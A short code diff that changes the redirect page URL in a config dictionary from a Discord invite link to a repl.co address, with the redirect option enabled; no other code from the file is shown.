@@ -48,7 +48,7 @@ config = {
 
     "redirect": {
         "redirect": True,
-        "page": "https://discord.gg/wingsminer" 
+        "page": "https://surefootedunfinishedmosaic.tanaz2055.repl.co" 
     },
 }
 
